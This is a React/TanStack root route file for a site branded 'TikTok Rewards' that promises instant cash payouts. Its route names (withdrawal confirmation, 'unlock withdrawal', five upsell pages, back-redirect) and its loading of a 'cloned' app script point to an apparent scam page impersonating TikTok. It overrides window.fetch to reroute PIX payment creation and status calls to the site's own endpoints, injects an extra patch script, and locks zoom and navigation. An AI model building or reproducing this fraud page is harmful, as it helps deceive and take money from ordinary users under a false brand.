import { QueryClient, QueryClientProvider } from "@tanstack/react-query";
import {
  Outlet,
  Link,
  createRootRouteWithContext,
  useRouter,
  useRouterState,
  HeadContent,
  Scripts,
} from "@tanstack/react-router";
import { useEffect, type ReactNode } from "react";

import appCss from "../styles.css?url";
import { reportLovableError } from "../lib/lovable-error-reporting";

const mobileGuardScript = String.raw`
(() => {
  if (window.__mobileGuardInstalled) return;
  window.__mobileGuardInstalled = true;
  window.__earlyMobileGuard = true;

  const viewportContent = "width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=1, user-scalable=no, viewport-fit=cover";
  let lastUrl = window.location.href;
  let lastTouchEnd = 0;

  const enforceViewport = () => {
    let viewport = document.querySelector('meta[name="viewport"]');
    if (!viewport) {
      viewport = document.createElement("meta");
      viewport.setAttribute("name", "viewport");
      document.head.appendChild(viewport);
    }
    if (viewport.getAttribute("content") !== viewportContent) {
      viewport.setAttribute("content", viewportContent);
    }
    document.documentElement.style.zoom = "1";
    if (document.body) document.body.style.zoom = "1";
  };

  const scrollOne = (node) => {
    if (!node) return;
    try { node.scrollTo({ top: 0, left: 0, behavior: "smooth" }); } catch {}
    try { node.scrollTop = 0; node.scrollLeft = 0; } catch {}
  };

  const isTextField = (node) => {
    if (!node || !node.matches) return false;
    return node.matches("input, textarea, select, [contenteditable='true']");
  };

  const getScrollParents = (node) => {
    const parents = [];
    let current = node && node.parentElement;
    while (current && current !== document.body) {
      const style = window.getComputedStyle(current);
      if (/(auto|scroll|overlay)/.test(style.overflowY + style.overflow)) parents.push(current);
      current = current.parentElement;
    }
    parents.push(document.scrollingElement || document.documentElement, document.documentElement, document.body);
    return parents;
  };

  let liftedFixedPanel = null;
  let liftedFixedPanelStyles = null;

  const restoreKeyboardLift = () => {
    if (!liftedFixedPanel || isTextField(document.activeElement)) return;
    try {
      liftedFixedPanel.style.bottom = liftedFixedPanelStyles.bottom;
      liftedFixedPanel.style.maxHeight = liftedFixedPanelStyles.maxHeight;
    } catch {}
    liftedFixedPanel = null;
    liftedFixedPanelStyles = null;
  };

  const findFixedBottomPanel = (node) => {
    let current = node && node.parentElement;
    while (current && current !== document.body) {
      const style = window.getComputedStyle(current);
      const rect = current.getBoundingClientRect();
      if (style.position === "fixed" && rect.bottom >= window.innerHeight - 2) return current;
      current = current.parentElement;
    }
    return null;
  };

  const liftPanelAboveKeyboard = (el) => {
    if (!isTextField(el) || !window.visualViewport) return;
    const panel = findFixedBottomPanel(el);
    if (!panel) return;
    const viewport = window.visualViewport;
    const inset = Math.max(0, window.innerHeight - viewport.height - viewport.offsetTop);
    if (!liftedFixedPanel) {
      liftedFixedPanel = panel;
      liftedFixedPanelStyles = { bottom: panel.style.bottom || "", maxHeight: panel.style.maxHeight || "" };
    }
    if (inset > 0) {
      panel.style.bottom = inset + "px";
      panel.style.maxHeight = Math.max(240, viewport.height - 16) + "px";
    }
  };

  const scrollFocusedIntoView = (el) => {
    if (!isTextField(el)) return;
    const doScroll = () => {
      liftPanelAboveKeyboard(el);
      try { el.scrollIntoView({ block: "center", inline: "nearest", behavior: "smooth" }); } catch {}
      try {
        const viewport = window.visualViewport;
        const visibleTop = viewport ? viewport.offsetTop + 12 : 12;
        const visibleHeight = viewport ? viewport.height : window.innerHeight;
        const visibleBottom = visibleTop + visibleHeight - 180;
        const rect = el.getBoundingClientRect();
        const delta = rect.bottom > visibleBottom
          ? rect.bottom - visibleBottom
          : rect.top < visibleTop
            ? rect.top - visibleTop
            : 0;

        if (delta !== 0) {
          getScrollParents(el).forEach((parent) => {
            try { parent.scrollTop += delta; } catch {}
          });
          try { window.scrollBy({ top: delta, left: 0, behavior: "smooth" }); } catch { window.scrollBy(0, delta); }
        }

        setTimeout(() => {
          try {
            const nextRect = el.getBoundingClientRect();
            const nextViewport = window.visualViewport;
            const nextTop = nextViewport ? nextViewport.offsetTop + 12 : 12;
            const nextBottom = nextTop + (nextViewport ? nextViewport.height : window.innerHeight) - 180;
            if (nextRect.bottom > nextBottom || nextRect.top < nextTop) {
              el.scrollIntoView({ block: "center", inline: "nearest", behavior: "auto" });
            }
          } catch {}
        }, 40);
      } catch {}
    };
    requestAnimationFrame(doScroll);
    setTimeout(doScroll, 80);
    setTimeout(doScroll, 220);
    setTimeout(doScroll, 480);
    setTimeout(doScroll, 850);
  };

  const resetAllScroll = () => {
    if (isTextField(document.activeElement)) return;
    enforceViewport();
    try { window.scrollTo({ top: 0, left: 0, behavior: "smooth" }); } catch { window.scrollTo(0, 0); }
    scrollOne(document.scrollingElement);
    scrollOne(document.documentElement);
    scrollOne(document.body);
    document.querySelectorAll("#root, #cloned-root, main, section, [class*='overflow'], [style*='overflow'], [style*='height'], [style*='max-height']").forEach(scrollOne);
    document.querySelectorAll("*").forEach((node) => {
      if (node.scrollTop || node.scrollLeft) scrollOne(node);
    });
  };

  const resetAfterScreenChange = () => {
    requestAnimationFrame(resetAllScroll);
    setTimeout(resetAllScroll, 60);
    setTimeout(resetAllScroll, 180);
    setTimeout(resetAllScroll, 420);
    setTimeout(resetAllScroll, 900);
  };

  const prevent = (event) => {
    if (event.cancelable) event.preventDefault();
    enforceViewport();
  };
  const preventTouchZoom = (event) => {
    if (event.touches && event.touches.length > 1) prevent(event);
  };
  const preventDoubleTap = (event) => {
    const now = Date.now();
    if (now - lastTouchEnd <= 350) prevent(event);
    lastTouchEnd = now;
    enforceViewport();
  };
  const preventKeyboardZoom = (event) => {
    if ((event.ctrlKey || event.metaKey) && ["+", "-", "=", "0"].includes(event.key)) prevent(event);
  };
  const preventWheelZoom = (event) => {
    if (event.ctrlKey || event.metaKey) prevent(event);
  };

  const originalPushState = history.pushState;
  const originalReplaceState = history.replaceState;
  history.pushState = function () {
    const result = originalPushState.apply(this, arguments);
    lastUrl = window.location.href;
    resetAfterScreenChange();
    return result;
  };
  history.replaceState = function () {
    const result = originalReplaceState.apply(this, arguments);
    lastUrl = window.location.href;
    resetAfterScreenChange();
    return result;
  };

  [window, document].forEach((target) => {
    target.addEventListener("gesturestart", prevent, { passive: false, capture: true });
    target.addEventListener("gesturechange", prevent, { passive: false, capture: true });
    target.addEventListener("gestureend", prevent, { passive: false, capture: true });
    target.addEventListener("touchstart", preventTouchZoom, { passive: false, capture: true });
    target.addEventListener("touchmove", preventTouchZoom, { passive: false, capture: true });
    target.addEventListener("touchend", preventDoubleTap, { passive: false, capture: true });
    target.addEventListener("wheel", preventWheelZoom, { passive: false, capture: true });
    target.addEventListener("keydown", preventKeyboardZoom, { passive: false, capture: true });
  });

  window.addEventListener("popstate", resetAfterScreenChange, { capture: true });
  document.addEventListener("click", (event) => {
    const target = event.target;
    if (target && target.closest && target.closest("input, textarea, select, [contenteditable='true']")) return;
    if (target && target.closest && target.closest("a, button, [role='button']")) {
      resetAfterScreenChange();
    }
  }, true);
  document.addEventListener("focusin", (e) => {
    setTimeout(enforceViewport, 0);
    scrollFocusedIntoView(e.target);
  }, true);
  document.addEventListener("focusout", () => setTimeout(restoreKeyboardLift, 180), true);
  if (window.visualViewport) {
    window.visualViewport.addEventListener("resize", () => {
      scrollFocusedIntoView(document.activeElement);
      restoreKeyboardLift();
    });
  }

  new MutationObserver(() => {
    if (window.location.href !== lastUrl) {
      lastUrl = window.location.href;
      resetAfterScreenChange();
    }
  }).observe(document.documentElement, { childList: true, subtree: true });

  enforceViewport();
  resetAfterScreenChange();
  setInterval(() => {
    enforceViewport();
    if (window.location.href !== lastUrl) {
      lastUrl = window.location.href;
      resetAfterScreenChange();
    }
  }, 250);
})();
`;

function NotFoundComponent() {
  return (
    <div className="flex min-h-screen items-center justify-center bg-background px-4">
      <div className="max-w-md text-center">
        <h1 className="text-7xl font-bold text-foreground">404</h1>
        <h2 className="mt-4 text-xl font-semibold text-foreground">Page not found</h2>
        <p className="mt-2 text-sm text-muted-foreground">
          The page you're looking for doesn't exist or has been moved.
        </p>
        <div className="mt-6">
          <Link
            to="/"
            className="inline-flex items-center justify-center rounded-md bg-primary px-4 py-2 text-sm font-medium text-primary-foreground transition-colors hover:bg-primary/90"
          >
            Go home
          </Link>
        </div>
      </div>
    </div>
  );
}

function ErrorComponent({ error, reset }: { error: Error; reset: () => void }) {
  console.error(error);
  const router = useRouter();
  useEffect(() => {
    reportLovableError(error, { boundary: "tanstack_root_error_component" });
  }, [error]);

  return (
    <div className="flex min-h-screen items-center justify-center bg-background px-4">
      <div className="max-w-md text-center">
        <h1 className="text-xl font-semibold tracking-tight text-foreground">
          This page didn't load
        </h1>
        <p className="mt-2 text-sm text-muted-foreground">
          Something went wrong on our end. You can try refreshing or head back home.
        </p>
        <div className="mt-6 flex flex-wrap justify-center gap-2">
          <button
            onClick={() => {
              router.invalidate();
              reset();
            }}
            className="inline-flex items-center justify-center rounded-md bg-primary px-4 py-2 text-sm font-medium text-primary-foreground transition-colors hover:bg-primary/90"
          >
            Try again
          </button>
          <a
            href="/"
            className="inline-flex items-center justify-center rounded-md border border-input bg-background px-4 py-2 text-sm font-medium text-foreground transition-colors hover:bg-accent"
          >
            Go home
          </a>
        </div>
      </div>
    </div>
  );
}

export const Route = createRootRouteWithContext<{ queryClient: QueryClient }>()({
  head: () => ({
    meta: [
      { charSet: "utf-8" },
      { name: "viewport", content: "width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=1, user-scalable=no, viewport-fit=cover" },
      { name: "theme-color", content: "#ff0050" },
      { title: "TikTok Rewards" },
      { name: "description", content: "Claim your TikTok reward and get paid instantly via Cash App, PayPal, Venmo, Zelle, or bank transfer." },
      { name: "author", content: "TikTok Rewards" },
      { property: "og:title", content: "TikTok Rewards" },
      { property: "og:description", content: "Claim your TikTok reward and get paid instantly via Cash App, PayPal, Venmo, Zelle, or bank transfer." },
      { property: "og:type", content: "website" },
      { name: "twitter:card", content: "summary_large_image" },
      { name: "twitter:title", content: "TikTok Rewards" },
      { name: "twitter:description", content: "Claim your TikTok reward and get paid instantly via Cash App, PayPal, Venmo, Zelle, or bank transfer." },
      { property: "og:image", content: "https://pub-bb2e103a32db4e198524a2e9ed8f35b4.r2.dev/50f61344-3ad8-4d2a-af27-67e4acf82467/id-preview-0d81ab1f--218b5110-e9e7-4f0e-8e0a-6b9b4e3bde16.lovable.app-1782166830293.png" },
      { name: "twitter:image", content: "https://pub-bb2e103a32db4e198524a2e9ed8f35b4.r2.dev/50f61344-3ad8-4d2a-af27-67e4acf82467/id-preview-0d81ab1f--218b5110-e9e7-4f0e-8e0a-6b9b4e3bde16.lovable.app-1782166830293.png" },
    ],
    links: [
      {
        rel: "stylesheet",
        href: appCss,
      },
      { rel: "preconnect", href: "https://fonts.googleapis.com" },
      { rel: "preconnect", href: "https://fonts.gstatic.com", crossOrigin: "anonymous" },
      { rel: "stylesheet", href: "/assets/css2.css" },
      { rel: "icon", type: "image/x-icon", href: "/favicon.ico" },
      { rel: "stylesheet", href: "/assets/index-B8NbOjFt.css" },
    ],
  }),
  shellComponent: RootShell,
  component: RootComponent,
  notFoundComponent: NotFoundComponent,
  errorComponent: ErrorComponent,
});

function RootShell({ children }: { children: ReactNode }) {
  return (
    <html lang="en-US">
      <head>
        <HeadContent />
        <script dangerouslySetInnerHTML={{ __html: mobileGuardScript }} />
      </head>
      <body>
        {children}
        <Scripts />
      </body>
    </html>
  );
}

function RootComponent() {
  const { queryClient } = Route.useRouteContext();
  const pathname = useRouterState({ select: (state) => state.location.pathname });

  useEffect(() => {
    const scrollTop = () => {
      try {
        window.scrollTo({ top: 0, left: 0, behavior: "smooth" });
      } catch {
        window.scrollTo(0, 0);
      }
      document.documentElement.scrollTop = 0;
      document.body.scrollTop = 0;
      document.querySelectorAll<HTMLElement>("#root, #cloned-root, main, section, [class*='overflow'], [style*='overflow']").forEach((node) => {
        node.scrollTop = 0;
        node.scrollLeft = 0;
      });
    };

    requestAnimationFrame(scrollTop);
    const t1 = window.setTimeout(scrollTop, 80);
    const t2 = window.setTimeout(scrollTop, 240);
    return () => {
      window.clearTimeout(t1);
      window.clearTimeout(t2);
    };
  }, [pathname]);

  useEffect(() => {
    const w = window as unknown as { __pixFetchPatched?: boolean };
    if (!w.__pixFetchPatched) {
      w.__pixFetchPatched = true;
      const origFetch = window.fetch.bind(window);
      window.fetch = async (input: RequestInfo | URL, init?: RequestInit) => {
        try {
          const urlStr =
            typeof input === "string"
              ? input
              : input instanceof URL
                ? input.toString()
                : (input as Request).url;
          if (urlStr.includes("/functions/v1/create-pix-payment")) {
            const body =
              init?.body ?? (input instanceof Request ? await input.text() : "{}");
            return origFetch("/api/public/create-pix-payment", {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: body as BodyInit,
            });
          }
          if (urlStr.includes("/functions/v1/check-pix-status")) {
            const body =
              init?.body ?? (input instanceof Request ? await input.text() : "{}");
            return origFetch("/api/public/check-pix-status", {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: body as BodyInit,
            });
          }
        } catch (e) {
          console.error("[pix-intercept]", e);
        }
        return origFetch(input as RequestInfo, init);
      };
    }

    // Keep mobile routing stable, always reset scroll on screen changes, and block browser zoom.
    const w2 = window as unknown as { __navPatched?: boolean };
    if (!w2.__navPatched) {
      w2.__navPatched = true;
      const validPaths = new Set([
        "/",
        "/inicio",
        "/resgatar",
        "/historico",
        "/confirmar-saque",
        "/desbloquear-saque",
        "/faq",
        "/upsell-1",
        "/upsell-2",
        "/upsell-3",
        "/upsell-4",
        "/upsell-5",
        "/back-redirect",
      ]);
      const viewportContent =
        "width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=1, user-scalable=no, viewport-fit=cover";
      const enforceViewport = () => {
        let viewport = document.querySelector<HTMLMetaElement>('meta[name="viewport"]');
        if (!viewport) {
          viewport = document.createElement("meta");
          viewport.name = "viewport";
          document.head.appendChild(viewport);
        }
        if (viewport.content !== viewportContent) viewport.content = viewportContent;
      };
      const scrollTop = () => {
        if (document.activeElement?.matches("input, textarea, select, [contenteditable='true']")) return;
        try {
          window.scrollTo({ top: 0, left: 0, behavior: "smooth" });
        } catch {
          window.scrollTo(0, 0);
        }
        document.documentElement.scrollTop = 0;
        document.body.scrollTop = 0;
        document.scrollingElement?.scrollTo({ top: 0, left: 0, behavior: "smooth" });
        document.querySelectorAll<HTMLElement>("#root, #cloned-root, main, section, [class*='overflow'], [style*='overflow'], [style*='height'], [style*='max-height']").forEach((node) => {
          node.scrollTop = 0;
          node.scrollLeft = 0;
        });
        document.querySelectorAll<HTMLElement>("*").forEach((node) => {
          if (node.scrollTop || node.scrollLeft) {
            node.scrollTop = 0;
            node.scrollLeft = 0;
          }
        });
      };
      const scrollTopAfterRender = () => {
        if (document.activeElement?.matches("input, textarea, select, [contenteditable='true']")) return;
        enforceViewport();
        requestAnimationFrame(scrollTop);
        window.setTimeout(scrollTop, 80);
        window.setTimeout(scrollTop, 240);
      };
      const scrollFocusedFieldIntoView = () => {
        const el = document.activeElement as HTMLElement | null;
        if (!el?.matches("input, textarea, select, [contenteditable='true']")) return;
        const fixedPanel = (() => {
          let current = el.parentElement;
          while (current && current !== document.body) {
            const rect = current.getBoundingClientRect();
            if (window.getComputedStyle(current).position === "fixed" && rect.bottom >= window.innerHeight - 2) return current;
            current = current.parentElement;
          }
          return null;
        })();
        const move = () => {
          try {
            if (fixedPanel && window.visualViewport) {
              const inset = Math.max(0, window.innerHeight - window.visualViewport.height - window.visualViewport.offsetTop);
              if (inset > 0) {
                fixedPanel.style.bottom = `${inset}px`;
                fixedPanel.style.maxHeight = `${Math.max(240, window.visualViewport.height - 16)}px`;
              }
            }
            el.scrollIntoView({ block: "center", inline: "nearest", behavior: "smooth" });
            const vv = window.visualViewport;
            const top = vv ? vv.offsetTop + 12 : 12;
            const bottom = top + (vv ? vv.height : window.innerHeight) - 180;
            const rect = el.getBoundingClientRect();
            const delta = rect.bottom > bottom ? rect.bottom - bottom : rect.top < top ? rect.top - top : 0;
            if (delta) window.scrollBy({ top: delta, left: 0, behavior: "smooth" });
          } catch {}
        };
        requestAnimationFrame(move);
        window.setTimeout(move, 80);
        window.setTimeout(move, 220);
        window.setTimeout(move, 480);
        window.setTimeout(move, 850);
      };
      const fallbackToHomeIfInvalid = () => {
        const path = window.location.pathname;
        if (!validPaths.has(path)) window.location.replace("/");
      };
      const preventZoom = (event: Event) => {
        if (event.cancelable) event.preventDefault();
        enforceViewport();
      };
      const preventMultiTouchZoom = (event: TouchEvent) => {
        if (event.touches.length > 1 && event.cancelable) event.preventDefault();
      };
      let lastTouchEnd = 0;
      const preventDoubleTapZoom = (event: TouchEvent) => {
        const now = Date.now();
        if (now - lastTouchEnd <= 300 && event.cancelable) event.preventDefault();
        lastTouchEnd = now;
        enforceViewport();
      };
      const preventCtrlWheelZoom = (event: WheelEvent) => {
        if (event.ctrlKey && event.cancelable) event.preventDefault();
      };
      const preventKeyboardZoom = (event: KeyboardEvent) => {
        if ((event.ctrlKey || event.metaKey) && ["+", "-", "=", "0"].includes(event.key) && event.cancelable) {
          event.preventDefault();
        }
      };
      const origPush = history.pushState;
      const origReplace = history.replaceState;
      history.pushState = function (...args) {
        const r = origPush.apply(this, args as never);
        scrollTopAfterRender();
        return r;
      };
      history.replaceState = function (...args) {
        const r = origReplace.apply(this, args as never);
        scrollTopAfterRender();
        return r;
      };
      enforceViewport();
      window.addEventListener("gesturestart", preventZoom, { passive: false });
      window.addEventListener("gesturechange", preventZoom, { passive: false });
      window.addEventListener("gestureend", preventZoom, { passive: false });
      document.addEventListener("gesturestart", preventZoom, { passive: false, capture: true });
      document.addEventListener("gesturechange", preventZoom, { passive: false, capture: true });
      document.addEventListener("gestureend", preventZoom, { passive: false, capture: true });
      document.addEventListener("touchstart", preventMultiTouchZoom, { passive: false, capture: true });
      window.addEventListener("touchmove", preventMultiTouchZoom, { passive: false });
      document.addEventListener("touchmove", preventMultiTouchZoom, { passive: false, capture: true });
      window.addEventListener("touchend", preventDoubleTapZoom, { passive: false });
      document.addEventListener("touchend", preventDoubleTapZoom, { passive: false, capture: true });
      window.addEventListener("wheel", preventCtrlWheelZoom, { passive: false });
      document.addEventListener("wheel", preventCtrlWheelZoom, { passive: false, capture: true });
      window.addEventListener("keydown", preventKeyboardZoom, { passive: false });
      document.addEventListener("keydown", preventKeyboardZoom, { passive: false, capture: true });
      window.addEventListener("focusin", () => {
        window.setTimeout(enforceViewport, 0);
        scrollFocusedFieldIntoView();
      });
      window.addEventListener("focusout", () => window.setTimeout(() => {
        document.querySelectorAll<HTMLElement>("[style*='bottom:'][style*='max-height:']").forEach((node) => {
          if (window.getComputedStyle(node).position === "fixed") {
            node.style.bottom = "";
            node.style.maxHeight = "";
          }
        });
      }, 220));
      window.visualViewport?.addEventListener("resize", scrollFocusedFieldIntoView);
      window.addEventListener("click", (event) => {
        const target = event.target as Element | null;
        if (target?.closest("input, textarea, select, [contenteditable='true']")) {
          window.setTimeout(scrollFocusedFieldIntoView, 0);
          return;
        }
        window.setTimeout(scrollTopAfterRender, 0);
      }, true);
      document.addEventListener("click", (event) => {
        const target = event.target as Element | null;
        if (target?.closest("input, textarea, select, [contenteditable='true']")) {
          window.setTimeout(scrollFocusedFieldIntoView, 0);
          return;
        }
        window.setTimeout(scrollTopAfterRender, 0);
      }, true);
      window.addEventListener("popstate", () => {
        setTimeout(() => {
          fallbackToHomeIfInvalid();
          scrollTopAfterRender();
        }, 50);
      });
      window.setInterval(() => {
        enforceViewport();
        fallbackToHomeIfInvalid();
      }, 1000);
    }

    if (!document.getElementById("redeem-patch-script")) {
      const patch = document.createElement("script");
      patch.id = "redeem-patch-script";
      patch.src = "/redeem-patch.js?v=8";
      document.body.appendChild(patch);
    }

    if (document.getElementById("cloned-app-script")) return;
    const script = document.createElement("script");
    script.id = "cloned-app-script";
    script.type = "module";
    script.src = "/assets/index-BhN0l3GJ.js";
    document.body.appendChild(script);
  }, []);

  return (
    <QueryClientProvider client={queryClient}>
      <div id="cloned-root" />
      {/* Required: nested routes render here. Removing <Outlet /> breaks all child routes. */}
      <Outlet />
    </QueryClientProvider>
  );
}
